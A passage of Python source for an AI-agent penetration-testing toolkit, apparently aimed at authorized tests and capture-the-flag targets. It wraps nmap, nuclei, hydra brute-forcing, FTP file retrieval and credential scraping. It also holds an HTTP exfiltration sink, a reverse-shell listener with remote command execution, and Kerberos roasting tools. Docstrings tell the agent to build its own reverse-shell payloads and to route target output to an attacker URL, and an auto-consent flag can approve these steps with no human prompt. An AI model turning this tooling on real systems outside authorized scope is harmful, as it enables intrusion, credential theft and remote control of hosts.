        hits.append(f"FTP {verb.decode()} {val.decode('utf-8', 'replace').strip()[:80]}")
    for m in re.finditer(
            rb"(?i)\b(user(?:name)?|login|email|pass(?:word|wd)?|pwd|secret|token|api[_-]?key)"
            rb"[\"'\]]?\s*[=:]\s*[\"']?([^\x00-\x20&\"'<>\x7f-\xff]{1,80})", data):
        hits.append(m.group(0).decode("ascii", "replace").strip("\"' ")[:120])
    return list(dict.fromkeys(hits))


async def http_download(ctx: ScanContext, args: dict) -> dict:
    """Download a response in FULL (binary-safe) and extract what matters — for files http_probe
    can't read: pcaps, zips, backups, images, source. Returns the text (or a `strings` extraction
    for binary) PLUS any credentials found inside. Use whenever a path is a file/binary or when a
    normal probe's body was truncated — don't judge a file by its first few KB."""
    import httpx
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 80))
    method = str(args.get("method") or "GET").upper()
    path = str(args.get("path") or "/")
    scheme = await _scheme_for(ctx, host, port, args.get("scheme"))
    url = f"{scheme}://{host}:{port}{path if path.startswith('/') else '/' + path}"
    headers = args.get("headers") if isinstance(args.get("headers"), dict) else {}
    cap = 12 * 1024 * 1024  # 12 MiB
    chunks: list[bytes] = []
    total = 0
    try:
        async with httpx.AsyncClient(timeout=45.0, verify=False, follow_redirects=True,
                                     cookies=ctx.http_cookies) as c:
            async with c.stream(method, url, headers=headers) as r:
                status = r.status_code
                ctype = r.headers.get("content-type", "")
                clen = r.headers.get("content-length", "")
                async for chunk in r.aiter_bytes():
                    chunks.append(chunk)
                    total += len(chunk)
                    if total > cap:
                        break
            _sync_cookies(ctx, c)
    except Exception as e:  # noqa: BLE001
        return {"url": url, "error": f"{type(e).__name__}: {str(e)[:200]}"}
    data = b"".join(chunks)[:cap]
    sample = data[:8192]
    printable = sum(1 for b in sample if b in (9, 10, 13) or 32 <= b < 127)
    is_text = bool(sample) and printable / len(sample) > 0.85
    if is_text:
        extract = data.decode("utf-8", "replace")[:9000]
    else:  # binary (pcap/zip/image): give the readable strings instead of mojibake
        extract = "\n".join(_extract_strings(data))[:9000]
    creds = _scan_creds(data)
    return {"url": url, "status": status, "content_type": ctype,
            "size": len(data), "declared_length": clen, "truncated": total > cap,
            "is_text": is_text, "credentials": creds[:50], "extract": extract}


async def run_nmap(ctx: ScanContext, args: dict) -> dict:
    """Full-control nmap: YOU compose the flags. Only the destructive-script safety block + scope
    guard are enforced; scan type, -Pn, ports, timing, detection scripts are all your call."""
    host = str(args.get("target") or ctx.target)
    _require_scope(host, ctx)
    raw = str(args.get("args") or "").strip()
    if not raw:
        raise ToolError("args required")
    extra = _guard_nmap_args(raw)
    parsed = await _run_nmap(ctx, *extra, host)
    return _summarize(parsed)


async def nuclei_scan(ctx: ScanContext, args: dict) -> dict:
    """Run nuclei (known-CVE / misconfig / exposure templates) over target URLs."""
    if not has_nuclei():
        raise ToolError("nuclei not found. Install it: `brew install nuclei` "
                        "(or `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`).")
    targets = args.get("targets") or [ctx.target]
    if isinstance(targets, str):
        targets = [targets]
    targets = [str(t).strip() for t in targets if str(t).strip()][:500]
    if not targets:
        raise ToolError("no targets")
    sev = str(args.get("severity") or "low,medium,high,critical")
    import tempfile
    fd, path = tempfile.mkstemp(suffix=".txt")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(targets))
    try:
        cmd = [NUCLEI_BIN, "-l", path, "-jsonl", "-silent", "-duc"]
        cmd += _nuclei_template_args()
        cmd += ["-severity", sev, "-timeout", "8", "-retries", "1",
                "-rate-limit", "150", "-c", "25"]
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        try:
            out, err = await asyncio.wait_for(proc.communicate(), timeout=300.0)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError("nuclei timed out after 300s") from None
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass
    if proc.returncode not in (0, 1):
        err_msg = err.decode("utf-8", "replace")
        if "no templates" in err_msg.lower():
            raise ToolError("nuclei has no templates installed. Run once: `nuclei -update-templates`")
        raise ToolError(f"nuclei exited {proc.returncode}: {err_msg[:300]}")
    findings = []
    for line in out.decode("utf-8", "replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            j = json.loads(line)
        except json.JSONDecodeError:
            continue
        info = j.get("info") or {}
        sev = str(info.get("severity") or "info").lower()
        findings.append({
            "template_id": j.get("template-id", ""),
            "name": info.get("name", j.get("template-id", "")),
            "severity": sev if sev in ("critical", "high", "medium", "low", "info") else "info",
            "description": (info.get("description") or "")[:300],
            "matched_at": j.get("matched-at", j.get("host", "")),
            "ip": j.get("ip", ""),
            "type": j.get("type", ""),
        })
    return {"findings": findings, "count": len(findings)}


async def request_consent(ctx: ScanContext, args: dict) -> dict:
    """Consent gate for high-impact actions (active exploitation, brute-force, ...).
    Interactive mode prompts [y/N]; otherwise auto-approves (--auto-consent) or
    auto-denies (safe default)."""
    action = str(args.get("action") or "")
    target = str(args.get("target") or "")
    risk = str(args.get("risk") or "high")
    ok = await _consent(ctx, action, target, risk)
    if ok:
        return {"decision": "approved", "note": "approved by operator"}
    return {"decision": "denied", "note": "denied — action not performed"}


async def hydra_brute(ctx: ScanContext, args: dict) -> dict:
    """Run hydra brute-force against ONE service. Consent-gated: only runs when the
    operator approved high-impact actions (--auto-consent)."""
    if not has_hydra():
        raise ToolError("hydra not found. Install: `brew install hydra`")
    target = str(args.get("target") or "").strip()
    service = str(args.get("service") or "ftp").lower()
    port = int(args.get("port", 0))
    if not target or not (1 <= port <= 65535):
        raise ToolError("target + port required")
    if not await _consent(ctx, f"brute-force {service} on {target}:{port}", target, "high"):
        raise ToolError("brute-force denied (no consent)")
    username = str(args.get("username") or "admin")
    wordlist = str(args.get("wordlist") or "").strip()
    import tempfile
    tmp_pw = None
    if wordlist:
        pw_flag = ["-P", wordlist]
    else:
        fd, tmp_pw = tempfile.mkstemp(suffix=".txt")
        with os.fdopen(fd, "w") as f:
            f.write("\n".join(DEFAULT_PASSWORDS))
        pw_flag = ["-P", tmp_pw]
    cmd = [HYDRA_BIN, "-l", username, *pw_flag, "-s", str(port), "-t", "4",
           "-f", "-w", "8", f"{service}://{target}"]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        try:
            out, err = await asyncio.wait_for(proc.communicate(), timeout=240.0)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError("hydra timed out after 240s") from None
    finally:
        if tmp_pw:
            try:
                os.unlink(tmp_pw)
            except OSError:
                pass
    text = out.decode("utf-8", "replace")
    creds = []
    for line in text.splitlines():
        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line, re.I)
        if m:
            creds.append({"login": m.group(1), "password": m.group(2)})
    return {"service": service, "target": target, "port": port,
            "credentials": creds, "found": len(creds) > 0, "raw_tail": text[-600:]}


async def exploit_search(ctx: ScanContext, args: dict) -> dict:
    """Search public exploits for a service/version (searchsploit if installed, plus
    a local scan of the nuclei template names). Read-only."""
    service = str(args.get("service") or "").strip()
    version = str(args.get("version") or "").strip()
    query = " ".join(x for x in (service, version) if x)
    if not query:
        raise ToolError("service/version required")
    results: list[dict] = []
    if shutil.which("searchsploit"):
        try:
            proc = await asyncio.create_subprocess_exec(
                "searchsploit", query, "--json",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=60.0)
            data = json.loads(out.decode("utf-8", "replace") or "{}")
            for e in (data.get("RESULTS_EXPLOIT") or [])[:20]:
                results.append({"title": e.get("Title"), "edb_id": e.get("EDB-ID"),
                                "path": e.get("Path"), "source": "exploitdb"})
        except Exception:
            pass
    # Local nuclei template-name search (covers CVEs nuclei can check).
    base = _nuclei_template_dir()
    if base and os.path.isdir(base):
        needle = service.lower()
        seen: set[str] = set()
        for root, _dirs, files in os.walk(base):
            for fn in files:
                if fn.endswith(".yaml") and needle in fn.lower():
                    rel = os.path.relpath(os.path.join(root, fn), base)
                    seen.add(rel)
                if len(seen) >= 25:
                    break
            if len(seen) >= 25:
                break
        for rel in sorted(seen):
            results.append({"template": rel, "source": "nuclei-templates"})
    if not results:
        return {"query": query, "results": [],
                "hint": "No local exploit match. Install searchsploit (`brew install exploitdb`) for full ExploitDB search."}
    return {"query": query, "results": results[:30]}


async def ftp_anon(ctx: ScanContext, args: dict) -> dict:
    """Try an FTP login + directory listing (read-only recon). Defaults to anonymous;
    pass user/password to test credentials you discovered elsewhere."""
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 21))
    user = str(args.get("user") or "anonymous")
    password = str(args.get("password") or "anonymous@")

    def _check():
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=8)
            resp = ftp.login(user, password)
            cwd = ""
            try:
                cwd = ftp.pwd()
            except Exception:
                pass
            listing: list[str] = []
            try:
                ftp.retrlines("LIST", listing.append)
            except Exception:
                pass
            try:
                ftp.quit()
            except Exception:
                pass
            return {"logged_in": True, "user": user, "anonymous": user == "anonymous",
                    "welcome": str(resp)[:200], "cwd": cwd, "listing": listing[:80]}
        except ftplib.all_errors as e:
            return {"logged_in": False, "user": user, "error": str(e)[:200]}

    result = await asyncio.to_thread(_check)
    return {"host": host, "port": port, **result}


async def ftp_get(ctx: ScanContext, args: dict) -> dict:
    """Download ONE file over FTP and return its contents (capped) — read a config, a
    backup, source, a flag. Defaults to anonymous; pass user/password for an authed account."""
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 21))
    path = str(args.get("path") or "").strip()
    if not path:
        raise ToolError("ftp_get needs a file path")
    user = str(args.get("user") or "anonymous")
    password = str(args.get("password") or "anonymous@")
    cap = 262144  # 256 KiB

    class _Stop(Exception):
        pass

    def _get():
        chunks: list[bytes] = []
        total = 0
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=8)
            ftp.login(user, password)

            def cb(block: bytes):
                nonlocal total
                chunks.append(block)
                total += len(block)
                if total > cap:
                    raise _Stop()
            try:
                ftp.retrbinary(f"RETR {path}", cb, blocksize=8192)
            except _Stop:
                pass
            try:
                ftp.quit()
            except Exception:
                pass
        except ftplib.all_errors as e:
            return {"ok": False, "error": str(e)[:200]}
        data = b"".join(chunks)[:cap]
        return {"ok": True, "bytes": len(data), "truncated": total > cap,
                "content": data.decode("utf-8", "replace")}

    result = await asyncio.to_thread(_get)
    return {"host": host, "port": port, "path": path, "user": user, **result}


async def smb_enum(ctx: ScanContext, args: dict) -> dict:
    """Enumerate SMB (445): OS/domain, dialects, signing, shares, users, sessions — via nmap's
    safe/discovery SMB scripts. Read-only; no auth or brute-force. The first move on any 445."""
    host = str(args.get("host") or args.get("target") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 445))
    scripts = ("smb-os-discovery,smb-protocols,smb2-security-mode,smb2-capabilities,"
               "smb-enum-shares,smb-enum-users,smb-enum-sessions,smb-enum-domains")
    parsed = await _run_nmap(ctx, "-p", str(port), "--script", scripts, host, timeout=240.0)
    return _summarize(parsed, open_only=False)


async def ssl_info(ctx: ScanContext, args: dict) -> dict:
    """Inspect TLS on a port: certificate (subject/issuer/SAN/validity) and supported
    ciphers/protocols via nmap's ssl-cert + ssl-enum-ciphers. Read-only."""
    host = str(args.get("host") or args.get("target") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 443))
    parsed = await _run_nmap(ctx, "-sV", "-p", str(port),
                             "--script", "ssl-cert,ssl-enum-ciphers", host, timeout=180.0)
    return _summarize(parsed, open_only=False)


async def tcp_send(ctx: ScanContext, args: dict) -> dict:
    """Send raw bytes to a TCP port and read the reply — talk to any protocol banner_grab can't
    (Redis 'INFO', memcached 'stats', a DB handshake, a custom service). `data` is text (\\r\\n/\\t
    escapes honored); set hex=true to send a hex string instead. Read/recon only."""
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 0))
    if not (1 <= port <= 65535):
        raise ToolError("invalid port")
    raw = args.get("data")
    raw = "" if raw is None else str(raw)
    if args.get("hex"):
        try:
            payload = bytes.fromhex(re.sub(r"\s+", "", raw))
        except ValueError:
            raise ToolError("hex=true but data is not valid hex") from None
    else:
        text = raw.replace("\\r", "\r").replace("\\n", "\n").replace("\\t", "\t")
        payload = text.encode("utf-8", "replace")
        if args.get("crlf", True) and payload and not payload.endswith((b"\n", b"\r")):
            payload += b"\r\n"
    read_bytes = min(int(args.get("read_bytes", 4096) or 4096), 16384)
    timeout = min(float(args.get("timeout", 8) or 8), 30.0)
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout)
        if payload:
            writer.write(payload)
            await writer.drain()
        data = await asyncio.wait_for(reader.read(read_bytes), timeout=timeout)
        writer.close()
        await writer.wait_closed()
    except asyncio.TimeoutError:
        return {"host": host, "port": port, "sent_bytes": len(payload),
                "response": "", "note": "no response (timeout)"}
    except (ConnectionRefusedError, OSError) as e:
        return {"host": host, "port": port, "sent_bytes": len(payload),
                "response": "", "note": f"connect failed: {e}"}
    return {"host": host, "port": port, "sent_bytes": len(payload),
            "response": data.decode("utf-8", "replace")[:4000],
            "response_hex": data[:200].hex()}


async def snmp_check(ctx: ScanContext, args: dict) -> dict:
    """Read SNMP system info with a community string (read-only recon)."""
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    community = str(args.get("community") or "public")
    if not shutil.which(SNMPWALK_BIN):
        raise ToolError("snmpwalk not found")
    proc = await asyncio.create_subprocess_exec(
        SNMPWALK_BIN, "-v", "2c", "-c", community, "-On", host, "1.3.6.1.2.1.1",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=30.0)
    except asyncio.TimeoutError:
        proc.kill()
        await proc.wait()
        raise ToolError("snmpwalk timed out") from None
    lines = out.decode("utf-8", "replace").strip().splitlines()
    return {"host": host, "community": community, "reachable": proc.returncode == 0,
            "sysinfo": lines[:20]}


async def note(ctx: ScanContext, args: dict) -> dict:
    text = str(args.get("text") or "").strip()
    ctx.notes.append(text)
    return {"noted": True, "notes_count": len(ctx.notes)}


async def report_finding(ctx: ScanContext, args: dict) -> dict:
    sev = str(args.get("severity") or "medium").lower()
    if sev not in ("critical", "high", "medium", "low", "info"):
        sev = "medium"
    conf = str(args.get("confidence") or "confirmed").lower()
    if conf not in ("confirmed", "probable", "possible"):
        conf = "confirmed"
    f = {
        "host": str(args.get("host") or ""),
        "port": args.get("port"),
        "service": str(args.get("service") or ""),
        "title": str(args.get("title") or "").strip(),
        "severity": sev,
        "confidence": conf,
        "evidence": str(args.get("evidence") or "").strip(),
        "remediation": str(args.get("remediation") or "").strip(),
    }
    if not f["title"]:
        return {"error": "title required"}
    # dedup by (host, port, title)
    for existing in ctx.findings:
        if (existing["host"], existing["port"], existing["title"]) == (f["host"], f["port"], f["title"]):
            return {"duplicate": True, "findings_count": len(ctx.findings)}
    ctx.findings.append(f)
    return {"reported": True, "findings_count": len(ctx.findings)}


async def get_findings(ctx: ScanContext, args: dict) -> dict:
    return {"findings": ctx.findings}


# ── Target resolution (operator names the scope in plain language) ────────────

_LOCAL_WORDS = {"local", "lan", "self", "this", "this network", "my network",
                "mynetwork", "localnet", "subnet", "here"}


def _primary_ipv4() -> str | None:
    """This machine's primary outbound IPv4 (no packets sent — UDP connect only)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        return None


def _iface_ipv4_prefix(iface: str) -> tuple[str, int] | None:
    """(ipv4, prefixlen) for a named interface, best-effort, Linux + macOS/BSD."""
    try:  # Linux: ip -o -4 addr show dev en0  ->  "... inet 192.168.1.5/24 ..."
        out = subprocess.run(["ip", "-o", "-4", "addr", "show", "dev", iface],
                             capture_output=True, text=True, timeout=5).stdout
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
        if m:
            return m.group(1), int(m.group(2))
    except (FileNotFoundError, OSError, subprocess.SubprocessError):
        pass
    try:  # macOS/BSD: ifconfig en0  ->  "inet 192.168.1.5 netmask 0xffffff00 ..."
        out = subprocess.run(["ifconfig", iface], capture_output=True, text=True, timeout=5).stdout
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+(0x[0-9a-fA-F]+|\d+\.\d+\.\d+\.\d+)", out)
        if m:
            ip, nm = m.group(1), m.group(2)
            bits = bin(int(nm, 16)).count("1") if nm.startswith("0x") else \
                ipaddress.IPv4Network(f"0.0.0.0/{nm}").prefixlen
            return ip, bits
    except (FileNotFoundError, OSError, subprocess.SubprocessError, ValueError):
        pass
    return None


def resolve_target_spec(spec: str, prefix: int | None = None) -> str:
    """Turn an operator phrase into a scannable target: IP/CIDR/domain as-is, an interface
    name ('en0') or 'local'/'lan' into this machine's subnet. Raises ToolError if it can't."""
    s = (spec or "").strip()
    low = s.lower()
    # "en0/24" or "en0 /24" -> interface + explicit prefix
    m = re.match(r"^([a-z][a-z0-9]*)\s*/\s*(\d{1,2})$", low)
    if m:
        low, s, prefix = m.group(1), m.group(1), int(m.group(2))
    try:  # already an IP or CIDR?
        ipaddress.ip_network(s, strict=False)
        if "/" not in s and prefix:
            return str(ipaddress.ip_network(f"{s}/{prefix}", strict=False))
        return s
    except ValueError:
        pass
    if low in _LOCAL_WORDS:
        ip = _primary_ipv4()
        if not ip:
            raise ToolError("could not determine this machine's local subnet")
        return str(ipaddress.ip_network(f"{ip}/{prefix or 24}", strict=False))
    info = _iface_ipv4_prefix(low)  # interface name?
    if info:
        ip, ipref = info
        return str(ipaddress.ip_network(f"{ip}/{prefix or ipref}", strict=False))
    return s  # otherwise a hostname/domain — pass through


async def set_target(ctx: ScanContext, args: dict) -> dict:
    """Set/replace the authorized scope from the operator's request."""
    spec = str(args.get("target") or args.get("spec") or "").strip()
    if not spec:
        raise ToolError("set_target needs a target (ip/cidr/domain or an interface like 'en0').")
    raw_prefix = args.get("prefix")
    prefix = int(raw_prefix) if str(raw_prefix or "").strip().isdigit() else None
    resolved = await asyncio.to_thread(resolve_target_spec, spec, prefix)
    ctx.target = resolved
    detail = f" (from {spec})" if resolved != spec else ""
    return {"ok": True, "target": resolved, "from": spec,
            "note": f"scope set to {resolved}{detail}"}


# ── Exploitation: readable exfil channel + reverse-shell listener (consent-gated) ──
# These turn a confirmed RCE into "run a command and read its output" / an interactive shell,
# so the agent reads flags itself instead of asking the operator to run nc or paste output.

def _source_ip_for(target: str) -> str:
    """The local IP the OS uses to reach `target` — the interface facing it (tun0 on a VPN)."""
    host = (target or "").split(",")[0].split("/")[0].strip() or "8.8.8.8"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((host, 80))
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        return "127.0.0.1"


def _b64_maybe(s: str) -> str:
    """Decode base64 if it looks like base64 text; otherwise return the original."""
    t = (s or "").strip()
    try:
        dec = base64.b64decode(t + "=" * (-len(t) % 4)).decode("utf-8", "replace")
        if dec and sum(c.isprintable() or c in "\r\n\t" for c in dec) / max(len(dec), 1) > 0.85:
            return dec
    except Exception:  # noqa: BLE001
        pass
    return t


class ExploitState:
    """Owns the attacker-side servers for one engagement: an HTTP exfil sink and a shell listener."""

    def __init__(self) -> None:
        self._exfil_server = None
        self.exfil_port = None
        self.exfil_hits: list[str] = []
        self._listener = None
        self.listen_port = None
        self._shell_reader = None
        self._shell_writer = None

    async def start_exfil(self, port: int) -> None:
        import urllib.parse
        hits = self.exfil_hits

        async def handle(reader, writer):
            try:
                data = await asyncio.wait_for(reader.read(1 << 20), timeout=15)
                text = data.decode("utf-8", "replace")
                head, _, body = text.partition("\r\n\r\n")
                payloads = [body.strip()] if body.strip() else []
                first = head.split("\r\n", 1)[0]
                if "?" in first:
                    q = first.split(" ")[1].split("?", 1)[1] if len(first.split(" ")) > 1 else ""
                    for kv in q.split("&"):
                        if "=" in kv:
                            payloads.append(urllib.parse.unquote_plus(kv.split("=", 1)[1]))
                for p in payloads:
                    if p:
                        hits.append(_b64_maybe(p))
                writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
                await writer.drain()
            except Exception:  # noqa: BLE001
                pass
            finally:
                try:
                    writer.close()
                except Exception:  # noqa: BLE001
                    pass

        self._exfil_server = await asyncio.start_server(handle, "0.0.0.0", port)
        self.exfil_port = port

    async def start_listener(self, port: int) -> None:
        async def handle(reader, writer):
            if self._shell_writer is None:
                self._shell_reader, self._shell_writer = reader, writer
            else:
                writer.close()  # first shell wins

        self._listener = await asyncio.start_server(handle, "0.0.0.0", port)
        self.listen_port = port

    def shell_connected(self) -> bool:
        return self._shell_writer is not None

    async def shell_exec(self, command: str, timeout: float = 20.0) -> str:
        if self._shell_writer is None:
            raise ToolError("no reverse shell connected yet — start listener, inject a reverse "
                            "shell to the attacker ip:port, wait for listener(status) connected, then retry")
        marker = f"__PWN{random.randint(10**7, 10**8)}__"
        self._shell_writer.write(f" {command} 2>&1; echo {marker}\n".encode())
        await self._shell_writer.drain()
        buf = b""
        try:
            while marker.encode() not in buf:
                chunk = await asyncio.wait_for(self._shell_reader.read(8192), timeout=timeout)
                if not chunk:
                    break
                buf += chunk
        except asyncio.TimeoutError:
            pass
        out = buf.decode("utf-8", "replace").split(marker)[0]
        return out.strip()


def _exploit(ctx: ScanContext) -> ExploitState:
    if ctx.exploit is None:
        ctx.exploit = ExploitState()
    return ctx.exploit


async def attacker_info(ctx: ScanContext, args: dict) -> dict:
    ip = _source_ip_for(ctx.target)
    return {"attacker_ip": ip, "note": "this is the IP the target can reach you on — use it for "
            "reverse shells and exfil callbacks"}


async def exfil(ctx: ScanContext, args: dict) -> dict:
    """Readable channel for BLIND RCE: start a local HTTP sink, inject a command that sends output
    to it (base64), then poll to read the decoded output."""
    action = str(args.get("action") or "start").lower()
    st = _exploit(ctx)
    if action == "poll":
        return {"hits": st.exfil_hits[-30:], "count": len(st.exfil_hits)}
    if action == "stop":
        if st._exfil_server is not None:
            st._exfil_server.close()
            st._exfil_server = None
        return {"ok": True, "stopped": True}
    # start
    if not await _consent(ctx, "start exfil/exploitation channel", ctx.target, "high"):
        return {"denied": True, "note": "operator did not approve exploitation"}
    port = int(args.get("port") or 8099)
    ip = _source_ip_for(ctx.target)
    try:
        if st._exfil_server is None:
            await st.start_exfil(port)
    except OSError as e:
        return {"error": f"could not bind exfil port {port}: {e}"}
    url = f"http://{ip}:{st.exfil_port}/"
    return {"ok": True, "attacker_ip": ip, "port": st.exfil_port, "url": url,
            "note": f"Any HTTP request that reaches {url} is captured here (body and query values are "
                    f"stored, base64 auto-decoded). Make the target send each command's output to this "
                    f"URL — you decide how (which download tool exists, how to encode so it survives "
                    f"transport), from what you observed about this machine. Then exfil(action=poll) to read it."}


async def listener(ctx: ScanContext, args: dict) -> dict:
    """Reverse-shell catcher: start a listener, inject a reverse shell, then use shell_exec."""
    action = str(args.get("action") or "start").lower()
    st = _exploit(ctx)
    if action == "status":
        return {"connected": st.shell_connected(), "port": st.listen_port}
    if action == "stop":
        if st._listener is not None:
            st._listener.close()
            st._listener = None
        return {"ok": True, "stopped": True}
    if not await _consent(ctx, "start reverse-shell listener", ctx.target, "high"):
        return {"denied": True, "note": "operator did not approve exploitation"}
    port = int(args.get("port") or 4444)
    ip = _source_ip_for(ctx.target)
    try:
        if st._listener is None:
            await st.start_listener(port)
    except OSError as e:
        return {"error": f"could not bind listener port {port}: {e}"}
    return {"ok": True, "attacker_ip": ip, "port": st.listen_port,
            "connected": st.shell_connected(),
            "note": f"A reverse shell that connects back to {ip}:{st.listen_port} will be caught here. "
                    f"Craft the payload YOURSELF for what this target actually has (reason from what "
                    f"you observed — which interpreters/tools exist, egress constraints; don't assume "
                    f"bash or nc). After delivering it, poll listener(action=status); once connected, use shell_exec."}


async def shell_exec(ctx: ScanContext, args: dict) -> dict:
    """Run a command in the connected reverse shell and return its output (read flags, enumerate)."""
    command = str(args.get("command") or args.get("cmd") or "").strip()
    if not command:
        raise ToolError("shell_exec needs a command")
    if not await _consent(ctx, f"run command on target: {command[:80]}", ctx.target, "high"):
        return {"denied": True, "note": "operator did not approve command execution"}
    st = _exploit(ctx)
    out = await st.shell_exec(command)
    return {"command": command, "output": out[:8000]}


# ── Active Directory / Windows toolkit ────────────────────────────────────────
# Thin wrappers over the standard AD pentest binaries (impacket, netexec/nxc, kerbrute,
# certipy, bloodhound-python). Each is scope-guarded; auth is supplied by the operator or
# by creds/hashes the agent already recovered. Read-only enumeration runs freely; anything
# that sprays, executes, dumps secrets or coerces is CONSENT-GATED. No methodology is baked
# in here — the agent decides which to use from what it observes, like any other tool.

def _which_any(*names: str) -> str | None:
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


def _impacket(tool: str) -> str | None:
    """Resolve an impacket example script across install styles (kali/pipx/pip)."""
    return _which_any(f"impacket-{tool}", f"{tool}.py", tool)


def _netexec() -> str | None:
    return _which_any("nxc", "netexec", "crackmapexec", "cme")


async def _run_cli(cmd: list[str], timeout: float = 300.0, stdin: str | None = None) -> dict:
    """Run an external tool, capture output. Returns {rc, stdout, stderr}. Raises ToolError if the
    binary is missing or it times out."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE if stdin is not None else None,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    except FileNotFoundError:
        raise ToolError(f"{cmd[0]} not found") from None
    try:
        out, err = await asyncio.wait_for(
            proc.communicate(stdin.encode() if stdin is not None else None), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        await proc.wait()
        raise ToolError(f"{os.path.basename(cmd[0])} timed out after {timeout:.0f}s") from None
    return {"rc": proc.returncode,
            "stdout": out.decode("utf-8", "replace"),
            "stderr": err.decode("utf-8", "replace")}


def _clean_nxc(text: str) -> str:
    """Strip NetExec's first-run bootstrap noise ("Creating home directory…") from captured output."""
    drop = ("first time use detected", "creating home directory", "creating missing folder",
            "copying default configuration", "generating ssl certificate", "initializing")
    return "\n".join(ln for ln in (text or "").splitlines()
                     if not any(d in ln.lower() for d in drop))


def _mktemp_lines(items) -> str:
    """Write a list (or newline string) to a temp file; return its path. Caller unlinks."""
    if isinstance(items, str):
        lines = [x for x in re.split(r"[\r\n,]+", items) if x.strip()]
    else:
        lines = [str(x).strip() for x in (items or []) if str(x).strip()]
    import tempfile
    fd, path = tempfile.mkstemp(suffix=".lst")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(lines))
    return path


def _auth_principal(args: dict) -> tuple[str, str, str, str, str]:
    """Pull (domain, user, password, nthash, dc_ip) from tool args."""
    return (str(args.get("domain") or "").strip(),
            str(args.get("user") or "").strip(),
            str(args.get("password") or "").strip(),
            str(args.get("nthash") or args.get("hash") or "").strip(),
            str(args.get("dc_ip") or args.get("target") or args.get("host") or "").strip())


def _hash_hunt(text: str) -> list[str]:
    """Pull crackable Kerberos hashes out of impacket output."""
    return [ln.strip() for ln in text.splitlines()
            if ln.strip().startswith(("$krb5asrep$", "$krb5tgs$", "$krb5pa$"))]


async def kerbrute_userenum(ctx: ScanContext, args: dict) -> dict:
    """Validate/enumerate domain usernames via Kerberos pre-auth (no password needed, no lockout)."""
    domain = str(args.get("domain") or "").strip()
    dc = str(args.get("dc_ip") or args.get("target") or ctx.target).strip()
    _require_scope(dc, ctx)
    if not domain:
        raise ToolError("kerbrute_userenum needs a domain")
    kb = _which_any("kerbrute")
    if not kb:
        raise ToolError("kerbrute not found. Install from github.com/ropnop/kerbrute (prebuilt binary).")
    users = _mktemp_lines(args.get("users") or args.get("userlist") or [])
    try:
        r = await _run_cli([kb, "userenum", "-d", domain, "--dc", dc, users, "-o", "/dev/null"],
                           timeout=300.0)
    finally:
        try:
            os.unlink(users)
        except OSError:
            pass
    valid = re.findall(r"VALID USERNAME:\s+(\S+)", r["stdout"])
    return {"domain": domain, "dc": dc, "valid_users": valid, "count": len(valid),
            "raw_tail": r["stdout"][-600:]}


async def asrep_roast(ctx: ScanContext, args: dict) -> dict:
    """AS-REP roast: get crackable hashes for accounts with pre-auth disabled (no creds needed)."""
    domain, user, password, nthash, dc = _auth_principal(args)
    _require_scope(dc or ctx.target, ctx)
    tool = _impacket("GetNPUsers")
    if not tool:
        raise ToolError("impacket GetNPUsers not found. Install impacket (`pipx install impacket`).")
    cmd = [tool, "-dc-ip", dc or ctx.target, "-format", "hashcat", "-no-pass"]
    users_file = None
    if args.get("users") or args.get("userlist"):
        users_file = _mktemp_lines(args.get("users") or args.get("userlist"))
        cmd = [tool, f"{domain}/", "-usersfile", users_file, "-dc-ip", dc or ctx.target,
               "-format", "hashcat", "-no-pass"]
    elif user:
        cmd = [tool, f"{domain}/{user}", "-dc-ip", dc or ctx.target, "-format", "hashcat", "-no-pass"]
    else:
        raise ToolError("asrep_roast needs a user or a users list")
    try:
        r = await _run_cli(cmd, timeout=240.0)
    finally:
        if users_file:
            try:
                os.unlink(users_file)
            except OSError:
                pass
    hashes = _hash_hunt(r["stdout"])
    return {"domain": domain, "hashes": hashes, "count": len(hashes), "raw_tail": r["stdout"][-600:]}


async def kerberoast(ctx: ScanContext, args: dict) -> dict:
    """Kerberoast: request service tickets for SPN accounts -> crackable $krb5tgs hashes (needs creds)."""
    domain, user, password, nthash, dc = _auth_principal(args)
    _require_scope(dc or ctx.target, ctx)
